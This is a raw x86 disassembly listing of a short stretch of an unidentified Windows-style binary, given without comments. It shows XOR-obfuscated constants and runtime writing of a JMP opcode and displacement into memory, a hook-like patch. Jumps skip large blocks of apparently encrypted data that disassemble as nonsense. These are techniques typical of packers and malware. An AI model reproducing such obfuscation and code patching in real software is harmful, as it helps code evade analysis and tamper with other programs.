  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	cmp    al,BYTE PTR [ebx+edi*8]
  415961:	(bad)  
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415900
  41596b:	jle    0x41593a
  41596d:	int3   
  41596e:	stc    
  41596f:	stos   DWORD PTR es:[edi],eax
  415970:	and    al,0x96
  415972:	out    0x49,al
  415974:	mov    ebx,?
  415976:	add    al,0x6a
  415978:	inc    esp
  415979:	mov    edx,0xb4af8afa
  41597e:	imul   eax,DWORD PTR [eax+0x4a7a924d],0xd8f7a773
  415988:	push   eax
  415989:	xchg   ebx,eax
  41598a:	dec    ebx
  41598b:	adc    BYTE PTR [eax-0x50eba455],ch
  415991:	stos   DWORD PTR es:[edi],eax
  415992:	scas   al,BYTE PTR es:[edi]
  415993:	int    0x26
  415995:	outs   dx,DWORD PTR ds:[esi]
  415996:	cmp    al,0x62
  415998:	test   BYTE PTR [ecx+edx*2-0x37],dh
  41599c:	outs   dx,DWORD PTR ds:[esi]
  41599d:	mov    dl,0xbb
  41599f:	xchg   BYTE PTR [ecx+0xaa1001d],dh
  4159a5:	jge    0x41596b
  4159a7:	mov    BYTE PTR [edi],bh
  4159a9:	fild   WORD PTR [ecx-0x7ee77dc0]
  4159af:	push   0xffffffd7
  4159b1:	push   ebx
  4159b2:	mov    dh,0x1b
  4159b4:	fimul  WORD PTR [eax+ecx*4-0x72d141a5]
  4159bb:	ror    edx,cl
  4159bd:	inc    ebp
  4159be:	or     al,0x53
  4159c0:	mov    ecx,0x3a1b802c
  4159c5:	cmp    BYTE PTR [esi-0x677f710],dl
  4159cb:	adc    eax,0x11678e3d
  4159d0:	inc    ebx
  4159d1:	leave  
  4159d2:	fimul  WORD PTR [edx]
  4159d4:	mov    DWORD PTR [eax],edx
  4159d6:	int3   
  4159d7:	sbb    al,0x3e
  4159d9:	xchg   ebx,eax
  4159da:	idiv   ebx
  4159dc:	bswap  edi
  4159de:	jo     0x415a31
  4159e0:	repnz inc ebp
  4159e2:	push   0x9
  4159e4:	xchg   edi,eax
  4159e5:	inc    edx
  4159e6:	lods   eax,DWORD PTR ds:[esi]
  4159e7:	pop    ss
  4159e8:	adc    BYTE PTR [edi-0x27f49f1f],ah
  4159ee:	(bad)  
  4159ef:	fistp  WORD PTR [edi]
  4159f1:	pushf  
  4159f2:	dec    ebx
  4159f3:	fst    QWORD PTR [ecx-0x26]
  4159f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f7:	in     eax,dx
  4159f8:	imul   ebp,esp,0x5df32216
  4159fe:	jbe    0x415a56
  415a00:	jge    0x4159d7
  415a02:	jae    0x4159c4
  415a04:	jns    0x4159b0
  415a06:	jmp    0x9b07bed5
  415a0b:	sbb    al,BYTE PTR [edx+0x679811a3]
  415a11:	out    0xa5,al
  415a13:	inc    ecx
  415a14:	repnz das 
  415a16:	dec    esi
  415a17:	adc    esi,0xffffffab
  415a1a:	inc    ecx
  415a1b:	fldenv ds:[edi-0x53bf64e]
  415a22:	pusha  
  415a23:	dec    esi
  415a24:	or     al,0x30
  415a26:	jle    0x415a7d
  415a28:	mov    ah,0x12
  415a2a:	outs   dx,BYTE PTR ds:[esi]
  415a2b:	xchg   ecx,eax
  415a2c:	push   ss
  415a2d:	inc    ebp
  415a2e:	xchg   esi,eax
  415a2f:	or     BYTE PTR [ebp-0x64555e5f],cl
  415a35:	sbb    ecx,DWORD PTR [edi]
  415a37:	jmp    0x902f:0xa5fc4cb
  415a3e:	cmp    ebp,edi
  415a40:	clc    
  415a41:	sub    BYTE PTR [ebx],al
  415a43:	aas    
  415a44:	pushf  
  415a45:	test   al,0x57
  415a47:	rol    BYTE PTR [ecx-0xf78299a],cl
  415a4d:	lahf   
  415a4e:	mov    ecx,DWORD PTR [edx]
  415a50:	mov    ebx,0x93701c7b
  415a55:	jp     0x415a7f
  415a57:	scas   eax,DWORD PTR es:[edi]
  415a58:	xor    DWORD PTR [ebp+0x6a8a286c],eax
  415a5e:	mov    ds:0xa4dc5f3c,al
  415a63:	popf   
  415a64:	jle    0x415ae5
  415a66:	outs   dx,DWORD PTR ds:[esi]
  415a67:	and    ebp,ebp
  415a69:	rol    ah,0x89
  415a6c:	hlt    
  415a6d:	dec    eax
  415a6e:	or     BYTE PTR [eax-0x1b],dl
  415a71:	addr16 xchg ecx,eax
  415a73:	push   0x36535032
  415a78:	sbb    al,0x82
  415a7a:	xor    al,0xf4
  415a7c:	outs   dx,DWORD PTR ds:[esi]
  415a7d:	mov    cl,0x6c
  415a7f:	lds    edi,FWORD PTR [edi]
  415a81:	aad    0x73
  415a83:	and    dl,dh
  415a85:	cmp    eax,0x32fe5a04
  415a8a:	outs   dx,BYTE PTR ds:[esi]
  415a8b:	jno    0x415ad0
  415a8d:	imul   esp,DWORD PTR [edx],0xc6dfed21
  415a93:	pushf  
  415a94:	push   0x633e0900
  415a99:	mov    ch,0xc
  415a9b:	pop    ds
  415a9c:	xlat   BYTE PTR ds:[ebx]
  415a9d:	xor    dh,ah
  415a9f:	mov    dh,0x24
  415aa1:	cdq    
  415aa2:	(bad)  
  415aa3:	push   0xffffff94
  415aa5:	(bad)  
  415aa6:	repz test eax,0xa56268e6
  415aac:	pop    ds
  415aad:	(bad)  
  415aae:	mov    ecx,0xfa55a2b3
  415ab3:	pop    ebx
  415ab4:	mov    bl,0xca
  415ab6:	in     eax,0xca
  415ab8:	sub    bl,BYTE PTR [edx-0x67]
  415abb:	ins    BYTE PTR es:[edi],dx
  415abc:	jl     0x415b3c
  415abe:	sub    DWORD PTR [ecx+0x75],esi
  415ac1:	inc    ebx
  415ac2:	fs inc ebp
  415ac4:	and    DWORD PTR [eax],ebp
  415ac6:	cmc    
  415ac7:	aam    0x3a
  415ac9:	mov    dh,0xe9
  415acb:	mov    WORD PTR [esi-0x5462fb5b],ds
  415ad1:	stc    
  415ad2:	push   eax
  415ad3:	or     DWORD PTR [edx],esi
  415ad5:	rcl    DWORD PTR [ebp+ebp*1-0x4b2de3f2],cl
  415adc:	mov    al,0xf8
  415ade:	jmp    FWORD PTR [edi]
  415ae0:	mov    BYTE PTR [esi+ebx*1],ah
  415ae3:	int3   
  415ae4:	ret    0x3200
  415ae7:	(bad)  
  415ae8:	cli    
  415ae9:	xchg   ecx,eax
  415aea:	mov    edx,0x10f5d618
  415aef:	cmp    eax,0x5bbf8908
  415af4:	sbb    BYTE PTR [esi+0x7],ch
  415af7:	shl    al,1
  415af9:	jne    0x415b57
  415afb:	mov    bh,0xcd
  415afd:	in     al,0xa4
  415aff:	lea    ebp,[edx]
  415b01:	test   ebx,edi
  415b03:	cwde   
  415b04:	mov    al,0x8b
  415b06:	bnd jnp 0x415b62
  415b09:	add    al,0x3
  415b0b:	and    ah,BYTE PTR [edi-0x510db429]
  415b11:	sti    
  415b12:	and    DWORD PTR [edi+0x2c],esi
  415b15:	mov    edi,0x1996a85e
  415b1a:	jg     0x415a9f
  415b1c:	adc    bh,BYTE PTR [eax]
  415b1e:	in     al,0xd
  415b20:	mov    eax,0xd3b642e7
  415b25:	fwait
  415b26:	int3   
  415b27:	jb     0x415ab8
  415b29:	imul   edi,DWORD PTR [edi],0xa9855a34
  415b2f:	popf   
  415b30:	push   ebx
  415b31:	sbb    eax,0x771a3be4
  415b36:	push   esp
  415b37:	loop   0x415b95
  415b39:	pop    ss
  415b3a:	in     al,dx
  415b3b:	pop    ss
  415b3c:	aad    0xf
  415b3e:	aaa    
  415b3f:	icebp  
  415b40:	pushf  
  415b41:	bts    DWORD PTR [eax+edx*1-0x49e4b700],esp
  415b49:	mov    dl,0xbe
  415b4b:	lods   al,BYTE PTR ds:[esi]
  415b4c:	out    dx,al
  415b4d:	ficom  DWORD PTR [ecx]
  415b4f:	(bad)  
  415b50:	in     al,dx
  415b51:	push   esi
  415b52:	pop    ds
  415b53:	lods   al,BYTE PTR ds:[esi]
  415b54:	stc    
  415b55:	xchg   edx,eax
  415b56:	stc    
  415b57:	sahf   
  415b58:	fbstp  TBYTE PTR [ecx]
  415b5a:	xchg   edx,eax
  415b5b:	add    BYTE PTR [edx+0x5d502e1c],ch
  415b61:	inc    ebp
  415b62:	jnp    0x415b5d
  415b64:	push   ebx
  415b65:	lock aas 
  415b67:	mov    al,0xd1
  415b69:	push   edi
  415b6a:	mov    ebx,gs
  415b6c:	test   al,cl
  415b6e:	(bad)  
  415b70:	lahf   
  415b71:	test   al,0x64
  415b73:	mov    edi,0xa338775a
  415b78:	sub    al,0xae
  415b7a:	push   0xffffff9b
  415b7c:	lds    eax,FWORD PTR [ebx-0x2fc4af8f]
  415b82:	sbb    dh,dl
  415b84:	adc    eax,0x933f1361
  415b89:	les    esi,FWORD PTR [edx+eiz*2-0x36aad6b1]
  415b90:	dec    eax
  415b91:	mov    ch,0x93
  415b93:	retf   0x545e
  415b96:	push   es
  415b97:	mov    ds:0xb075fdbf,eax
  415b9c:	stos   DWORD PTR es:[edi],eax
  415b9d:	es ret 
  415b9f:	ss bnd jg 0x415bf5
  415ba3:	xor    BYTE PTR [esi],0x85
  415ba6:	cmp    eax,0xd2f63ac5
  415bab:	push   ds
  415bac:	inc    eax
  415bad:	neg    DWORD PTR [edx]
  415baf:	dec    esi
  415bb0:	cmp    DWORD PTR [eax+0x1bb27d0a],ebx
  415bb6:	pop    ss
  415bb7:	pop    ecx
  415bb8:	into   
  415bb9:	xor    DWORD PTR [ecx+0x24],edi
  415bbc:	xchg   esp,eax
  415bbd:	clc    
  415bbe:	adc    bl,BYTE PTR [ebp-0x9]
  415bc1:	inc    ebp
  415bc2:	and    al,0x2a
  415bc4:	test   esp,eax
  415bc6:	sub    ah,BYTE PTR [edx]
  415bc8:	xor    eax,0x55d14082
  415bcd:	data16 sub al,0x49
  415bd0:	test   DWORD PTR [ecx+0x2],eax
  415bd3:	stc    
  415bd4:	pop    ds
  415bd5:	out    0x2c,al
  415bd7:	(bad)  
  415bd8:	out    dx,al
  415bd9:	adc    eax,0x764f5c19
  415bde:	sti    
  415bdf:	cdq    
  415be0:	add    BYTE PTR [edi],ch
  415be2:	xlat   BYTE PTR ds:[ebx]
  415be3:	push   esp
  415be4:	jae    0x415bb1
  415be6:	jnp    0x415bae
  415be8:	sbb    dl,BYTE PTR [eax+eiz*4-0x349d12df]
  415bef:	rol    BYTE PTR [edx+ebp*4],cl
  415bf2:	adc    DWORD PTR [eax-0x5afa95a4],0xffffffe7
  415bf9:	add    BYTE PTR [edx+esi*8],0xf5
  415bfd:	sub    BYTE PTR [ebx-0x6f746178],0x8d
  415c04:	mov    edx,DWORD PTR [ecx+0x51]
  415c07:	mov    DWORD PTR ds:0x42a7f5,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	iret   
  415c40:	mov    ah,BYTE PTR [edx+0x7f158a15]
  415c46:	js     0x415bdd
  415c48:	jle    0x415cc2
  415c4a:	js     0x415c99
  415c4c:	into   
  415c4d:	push   esi
  415c4e:	int    0xd7
  415c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c51:	pop    ss
  415c52:	ins    BYTE PTR es:[edi],dx
  415c53:	jo     0x415bed
  415c55:	and    al,0x69
  415c57:	sbb    ah,dh
  415c59:	and    DWORD PTR [ebp-0x11ebba2a],esi
  415c5f:	punpckldq mm1,DWORD PTR [ebp+0x37]
  415c63:	jecxz  0x415c43
  415c65:	push   esp
  415c66:	lds    edx,FWORD PTR [ecx+0xa53e6d]
  415c6c:	cmp    al,0xad
  415c6e:	fs mov dh,0x73
  415c71:	(bad)  
  415c72:	iret   
  415c73:	mov    al,0xad
  415c75:	jmp    0xe771:0x966354e0
  415c7c:	pop    ecx
  415c7d:	cmp    BYTE PTR [edx],dl
  415c7f:	ins    DWORD PTR es:[edi],dx
  415c80:	inc    esp
  415c81:	xlat   BYTE PTR ds:[ebx]
  415c82:	mov    edi,ds
  415c84:	aam    0x2f
  415c86:	lock xor bh,BYTE PTR [edi+ecx*2+0x54]
  415c8b:	push   0x5519ed93
  415c90:	(bad)  
  415c92:	mov    al,ds:0x150f65f5
  415c97:	fwait
  415c98:	or     BYTE PTR [edi],bh
  415c9a:	push   edi
  415c9b:	mov    DWORD PTR [eax-0x74],esi
  415c9e:	push   ss
  415c9f:	out    dx,al
  415ca0:	cli    
  415ca1:	int    0x23
  415ca3:	loop   0x415c34
  415ca5:	add    DWORD PTR [eax-0x5c],0x4667d6a8
  415cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cad:	jmp    0x415cdd
  415caf:	call   0xa54a120e
  415cb4:	or     eax,DWORD PTR [esi-0x74520fd2]
  415cba:	scas   al,BYTE PTR es:[edi]
  415cbb:	aas    
  415cbc:	jmp    0x415d01
  415cbe:	push   ebp
  415cbf:	adc    al,dh
  415cc1:	push   eax
  415cc2:	aas    
  415cc3:	and    BYTE PTR [ecx],0x87
  415cc6:	adc    al,0x6b
  415cc8:	push   esp
  415cc9:	push   eax
  415cca:	mov    ch,0xd6
  415ccc:	outs   dx,BYTE PTR ds:[esi]
  415ccd:	sub    ah,dl
  415ccf:	fcmovne st,st(5)
  415cd1:	xchg   DWORD PTR [edx],eax
  415cd3:	inc    eax
  415cd4:	scas   eax,DWORD PTR es:[edi]
  415cd5:	lods   al,BYTE PTR ds:[esi]
  415cd6:	mov    eax,ds:0x8ebe5817
  415cdb:	(bad)  
  415cdc:	jmp    0x415ca4
  415cde:	push   eax
  415cdf:	or     eax,0xf9062b66
  415ce4:	iret   
  415ce5:	xor    DWORD PTR [ecx],edi
  415ce7:	loop   0x415c6e
  415ce9:	mov    edi,0xb5a71006
  415cee:	sbb    BYTE PTR [ebx],bh
  415cf0:	sub    bh,BYTE PTR [ecx-0x50]
  415cf3:	xor    esi,DWORD PTR [edi+0x369c6ca8]
  415cf9:	imul   ebx,DWORD PTR [ebx],0x38
  415cfc:	data16 mov al,0x35
  415cff:	push   0x153b4f9a
  415d04:	jle    0x415d54
  415d06:	push   0x8ad70910
  415d0b:	sbb    esp,esp
  415d0d:	arpl   di,cx
  415d0f:	test   al,0x1f
  415d11:	out    dx,al
  415d12:	bound  edx,QWORD PTR [edi-0x78]
  415d15:	jp     0x415d6f
  415d17:	out    dx,eax
  415d18:	jmp    0x2aaa:0xe40545ff
  415d1f:	in     al,0x90
  415d21:	and    BYTE PTR [ebx+edx*1-0x23],0xfb
  415d26:	add    BYTE PTR [esi+edx*4-0xc],al
  415d2a:	mov    ecx,0x72441538
  415d2f:	sub    BYTE PTR [edi+ebp*2-0x7],bl
  415d33:	xor    DWORD PTR [eax-0x21e06df0],ebp
  415d39:	pop    eax
  415d3a:	inc    esp
  415d3b:	push   esp
  415d3c:	icebp  
  415d3d:	stos   DWORD PTR es:[edi],eax
  415d3e:	mov    ch,0xe9
  415d40:	push   cs
  415d41:	sub    al,0x9b
  415d43:	aad    0xb7
  415d45:	andnps xmm4,XMMWORD PTR [edx-0x2094e807]
  415d4c:	outs   dx,DWORD PTR ds:[esi]
  415d4d:	sti    
  415d4e:	sub    BYTE PTR [ebp+ecx*1+0x5f],dl
  415d52:	push   esi
  415d53:	jle    0x415d92
  415d55:	outs   dx,DWORD PTR ds:[esi]
  415d56:	in     eax,dx
  415d57:	dec    edi
  415d58:	mov    eax,0x86b6b943
  415d5d:	sub    cl,bl
  415d5f:	rol    DWORD PTR ds:0x38dbdc2f,1
  415d65:	jns    0x415dc3
  415d67:	push   esp
  415d68:	dec    ebx
  415d69:	jae    0x415cfe
  415d6b:	retf   
  415d6c:	mov    cl,0xa1
  415d6e:	in     eax,dx
  415d6f:	sbb    bl,BYTE PTR ds:0x1343a981
  415d75:	push   ss
  415d76:	and    eax,0xe012db38
  415d7b:	pop    ss
  415d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d7d:	stos   DWORD PTR es:[edi],eax
  415d7e:	or     DWORD PTR [ebx+0x32ac5555],0x4d38eb4e
  415d88:	xchg   ebp,eax
  415d89:	xchg   esp,eax
  415d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d8b:	adc    dl,BYTE PTR [esi+edx*1-0x13]
  415d8f:	loop   0x415df5
  415d91:	jp     0x415d64
  415d93:	xor    DWORD PTR [esi-0x5a2e6920],ebp
  415d99:	xor    eax,0xcdd2c288
  415d9e:	add    eax,0x1712ab3b
  415da3:	add    DWORD PTR ds:0xaf85d256,0x8884dae6
  415dad:	xchg   BYTE PTR [edi],al
  415daf:	adc    al,0x7f
  415db1:	out    0xaf,al
  415db3:	test   al,0xdc
  415db5:	mov    ah,BYTE PTR [ebp+0x4b37e131]
  415dbb:	jb     0x415d8b
  415dbd:	pop    esp
  415dbe:	scas   al,BYTE PTR es:[edi]
  415dbf:	push   cs
  415dc0:	js     0x415d64
  415dc2:	mul    DWORD PTR gs:[edi-0x77930fbf]
  415dc9:	in     eax,dx
  415dca:	dec    ecx
  415dcb:	aam    0xe0
  415dcd:	inc    ebx
  415dce:	pop    es
  415dcf:	cld    
  415dd0:	jno    0x415da0
  415dd2:	and    bl,BYTE PTR [ebx+0x26d95aae]
  415dd8:	add    al,0x3
  415dda:	popa   
  415ddb:	dec    ebx
  415ddc:	lock ins DWORD PTR es:[edi],dx
  415dde:	inc    edi
  415ddf:	sub    eax,0xd1276b80
  415de4:	push   edi
  415de5:	mul    DWORD PTR [edi-0xc]
  415de8:	push   eax
  415de9:	(bad)  
  415dea:	pop    esp
  415deb:	fidivr WORD PTR [ebx]
  415ded:	lods   al,BYTE PTR ds:[esi]
  415dee:	imul   ebx,DWORD PTR [esi-0x32be14bb],0x7c63aab6
  415df8:	scas   al,BYTE PTR es:[edi]
  415df9:	repnz out 0x73,eax
  415dfc:	lods   al,BYTE PTR ds:[esi]
  415dfd:	xor    eax,0x25b2cbe5
  415e02:	enter  0x16d2,0xfc
  415e06:	jge    0x415d91
  415e08:	fnstenv [ecx-0x34]
  415e0b:	cs dec ecx
  415e0d:	aam    0x8a
  415e0f:	stos   DWORD PTR es:[edi],eax
  415e10:	out    0x32,al
  415e12:	in     al,dx
  415e13:	sti    
  415e14:	mov    ah,0xfb
  415e16:	stos   DWORD PTR es:[edi],eax
  415e17:	push   ss
  415e18:	or     al,0xc6
  415e1a:	(bad)  
  415e1b:	lahf   
  415e1c:	pop    ss
  415e1d:	loop   0x415e7d
  415e1f:	ja     0x415ded
  415e21:	js     0x415dd2
  415e23:	mov    ebx,0x6aa3ede6
  415e28:	cwde   
  415e29:	pop    ebx
  415e2a:	pop    ecx
  415e2b:	and    dh,BYTE PTR [ebx-0x48]
  415e2e:	out    0x88,al
  415e30:	jle    0x415e09
  415e32:	pmaxsw mm2,QWORD PTR [eax]
  415e35:	arpl   WORD PTR [edi+eax*1+0x21a9a57d],dx
  415e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e3d:	loop   0x415de0
  415e3f:	cmp    DWORD PTR [ebp+0x26],ecx
  415e42:	dec    ecx
  415e43:	ds push eax
  415e45:	xchg   ebp,eax
  415e46:	inc    esp
  415e47:	mov    edi,0xc2d72957
  415e4c:	inc    ecx
  415e4d:	jb     0x415df9
  415e4f:	jbe    0x415de5
  415e51:	pop    edx
  415e52:	push   edi
  415e53:	push   eax
  415e54:	retf   
  415e55:	dec    ecx
  415e57:	(bad)  
  415e58:	jecxz  0x415e0b
  415e5a:	jb     0x415edb
